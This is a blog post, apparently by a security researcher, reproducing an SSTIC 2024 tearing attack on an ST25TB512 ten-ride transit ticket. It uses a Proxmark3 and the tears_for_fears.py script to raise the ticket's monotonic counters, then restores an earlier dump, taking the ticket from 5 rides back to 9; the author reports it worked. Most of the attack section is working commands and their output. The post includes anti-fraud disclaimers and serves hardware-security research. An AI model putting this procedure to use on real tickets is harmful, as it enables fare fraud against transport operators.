---
categories:
  - smartcards
  - nfc
  - st25tb
tags:
  - st25tb
  - tearing
  - proxmark
  - st25tb512-at
  - sstic
---

After the talk [Tears for fears, breaking an RFID counter](https://www.sstic.org/2024/presentation/tears_for_fears_breaking_an_rfid_counter/) @ SSTIC 2024, I wanted to play with real tickets, in real life.

> This note is not intended to help to fraud in public transports, but again to _encourage_ the abandonment of this outdated and insecure technology.

Spoiler alert, it _can_ work.

## Credits
- Tear off attacks: Philippe Teuwen (Quarkslab) & Christian Herrmann (Proxmark3) - <https://blog.quarkslab.com/rfid-monotonic-counter-anti-tearing-defeated.html>
- ST25TB tear off: Jean-Joseph Marty, Pierre Granier & Rémy Delion (AMOSSYS) -  <https://www.sstic.org/2024/presentation/tears_for_fears_breaking_an_rfid_counter/> and their script: <https://gitlab.com/SiliconOtter/tears4fears>

## The hardware

Obviously, you need a Proxmark3 - all versions seem to be ok, but the RDV2 option with latest Iceman's firmware has my preference: <https://github.com/RfidResearchGroup/proxmark3>

## The ticket

Depending on the city's transport options, you can usually have 1 trip, 2 trips, 10 trips, 1 day, 7 days, etc... Here, I tested with a 10x1h.

As expected, each time the ticket is used (after >1h), counters are decremented (by 1 here)

| Ride(s) left    | Counters values                |
|-----------------|--------------------------------|
| 10 (never used) | 5: `0A 00 00 04`, 6: `FE FF FF FF` |
| 9               | 5: `09 00 00 04`, 6: `FD FF FF FF` |
| 8               | 5: `08 00 00 04`, 6: `FC FF FF FF` |
| 7               | 5: `07 00 00 04`, 6: `FB FF FF FF` |
| 6               | 5: `06 00 00 04`, 6: `FA FF FF FF` |
| 5               | 5: `05 00 00 04`, 6: `F9 FF FF FF` |

> How it all works is described in: [ST25TB series NFC tags for fun in French public transports](https://raw.githubusercontent.com/gentilkiwi/st25tb_kiemul/main/ST25TB_transport.pdf)

After each usage, we backup the content of the card, to be able to restore associated signature after.

```
-rw-r--r-- 1 gentilkiwi gentilkiwi 68 Jun  8 12:52 hf-14b-~-10x1h-10.bin
-rw-r--r-- 1 gentilkiwi gentilkiwi 68 Jun  8 12:52 hf-14b-~-10x1h-09.bin
-rw-r--r-- 1 gentilkiwi gentilkiwi 68 Jun  8 17:05 hf-14b-~-10x1h-08.bin
-rw-r--r-- 1 gentilkiwi gentilkiwi 68 Jun  8 17:06 hf-14b-~-10x1h-07.bin
-rw-r--r-- 1 gentilkiwi gentilkiwi 68 Jun  8 20:45 hf-14b-~-10x1h-06.bin
-rw-r--r-- 1 gentilkiwi gentilkiwi 68 Jun  8 22:16 hf-14b-~-10x1h-05.bin
...
```

_Here, I did not want to wait to go lower than 5 rides left to test :) - I'm not patient_

## Counter 0x06

As it can be difficult to achieve to increase the 0x06 counter (at the opposite of 0x05, with more `1` & `0` variations inside), we start with this one to see how high we can go:

### Remember, we started with:

```
[=]   5/0x05 | 05 00 00 04 |   | ....
[=]   6/0x06 | F9 FF FF FF |   | ....
```

### Tearing

```
gentilkiwi@rog-k:/mnt/c/security$ python3 tears_for_fears.py --strat 1 --block 6 --pm3-client ./proxmark3_rdv2/pm3
UID: ~

Initial Value : F9FFFFFF : 11111111111111111111111111111001
Trigger Value : F7FFFFFF : 11111111111111111111111111110111
Payload Value : EFFFFFFF : 11111111111111111111111111101111

Color coding :
        Value we started with
        Target value (trigger|payload)
        Below target value (trigger|payload)
        Above target value (trigger|payload)
        Above initial value

Good ? Y/n :

Write and tear trigger value : F7FFFFFF

Tear timing = 130 us : 100 % : F9FFFFFF : 11111111111111111111111111111001

Tear timing = 130 us : 100 % : F9FFFFFF : 11111111111111111111111111111001

...

Tear timing = 144 us :  88 % : F7FFFFFF : 11111111111111111111111111110111
                        12 % : F9FFFFFF : 11111111111111111111111111111001

Tear timing = 144 us : 100 % : F7FFFFFF : 11111111111111111111111111110111

Tear timing = 144 us :  88 % : F7FFFFFF : 11111111111111111111111111110111
                        12 % : FFFFFFFF : 11111111111111111111111111111111

...

Set Reader <-> Card distance to 1 and press enter :

100.0 % : FFFFFFFF : 11111111111111111111111111111111

Trying to consolidate.
Keep card at the max distance from the reader.

Writing : FEFFFFFF
Writing : FDFFFFFF

Set Reader <-> Card distance to 0 and press enter :

Success !
```

_We were **very** lucky ultimately..._

### Reading counter to check

```
[usb] pm3 --> hf 14b rdbl --block 0x06
[+] block 06... FD FF FF FF  | ....
```

We had `F9 FF FF FF`, and now `FD FF FF FF` (previously associated with value `09 00 00 04` in counter 5)


## Counter 0x05

Usually, this counter is more easy to tear, as far it's not 0! But sometimes we can be less lucky :(

### Remember, we started with:

```
[=]   5/0x05 | 05 00 00 04 |   | ....
[=]   6/0x06 | F9 FF FF FF |   | ....
```

### Tearing

```
gentilkiwi@rog-k:/mnt/c/security$ python3 tears_for_fears.py --strat 1 --block 5 --pm3-client ./proxmark3_rdv2/pm3
UID: ~


No bits usable for leverage
Current value : 05000004 : 00000100000000000000000000000101
```

No luck... :(
> we can try to help it with more bits in the counter by decreasing it manually

```
[usb] pm3 --> hf 14b wrbl --block 0x05 --data f0ffff03
[+] SRIX4K Write block 05 - F0 FF FF 03
[+] SRx write block ( ok )
```

```
gentilkiwi@rog-k:/mnt/c/security$ python3 tears_for_fears.py --strat 1 --block 5 --pm3-client ./proxmark3_rdv2/pm3
UID: ~

Initial Value : F0FFFF03 : 00000011111111111111111111110000
Trigger Value : EFFFFF03 : 00000011111111111111111111101111
Payload Value : DFFFFF03 : 00000011111111111111111111011111

Color coding :
        Value we started with
        Target value (trigger|payload)
        Below target value (trigger|payload)
        Above target value (trigger|payload)
        Above initial value

Good ? Y/n :

Write and tear trigger value : EFFFFF03

Tear timing = 130 us : 100 % : F0FFFF03 : 00000011111111111111111111110000

Tear timing = 130 us : 100 % : F0FFFF03 : 00000011111111111111111111110000

...
Tear timing = 183 us :  62 % : EFFFFF03 : 00000011111111111111111111101111
                        38 % : DFFFFF03 : 00000011111111111111111111011111


Set Reader <-> Card distance to 1 and press enter :

62.5 % : FFFFFF13 : 00010011111111111111111111111111
37.5 % : FFFFFF1B : 00011011111111111111111111111111

Trying to consolidate.
Keep card at the max distance from the reader.

Writing : FEFFFF1B
Writing : FEFFFF1B
Writing : FEFFFF1B
Writing : FEFFFF1B
Writing : FEFFFF1B
...
```
_here it was looping endlessly :(, `CTRL+C`...._

### Reading counter to check

```
[usb] pm3 --> hf 14b rdbl --block 0x05
[+] block 05... FF FF FF 13  | ....
```
_here again, we were lucky..._
We had `05 00 00 04`, and now `FF FF FF 13`...writing value `09 00 00 04` in counter 5 is now possible as it's < to current value.


## Restore ticket

You can write your own values, or let the Proxmark3 restore blocks for you, then check:

```
[usb] pm3 --> hf 14b restore --512 --file hf-14b-~-10x1h-09.bin
[+] Loaded 68 bytes from binary file `hf-14b-~-10x1h-09.bin`
[=] Copying to SRI512
[=] SRx write block 15/15 ( ok )

[+] Card loaded 16 blocks from file
[=] Done!
[usb] pm3 --> hf 14b dump --ns
[+] found a SRT512 tag
[=] reading tag memory
[=] .................

[=] -------- SRT512 tag memory ---------

[=]  block#  | data        |lck| ascii
[=] ---------+-------------+---+------
[=]   0/0x00 | ** ** ** ** |   | ....
[=]   1/0x01 | ** ** *0 25 |   | ....
[=]   2/0x02 | ** ** ** ** |   | ....
[=]   3/0x03 | 00 00 00 00 |   | ....
[=]   4/0x04 | 00 00 00 00 |   | ....
[=]   5/0x05 | 09 00 00 04 |   | ....
[=]   6/0x06 | FD FF FF FF |   | ....
[=]   7/0x07 | 00 00 00 00 |   | ....
...
```

> we are now with previous values restored in the ticket!

## Results

1. We now have a ticket with 9 rides left
    1. It was 5 before.
2. ~~It will be tested tomorrow - result will be posted here.~~
    1. it worked

> Yes, I have valid tickets to not commit fraud when doing this...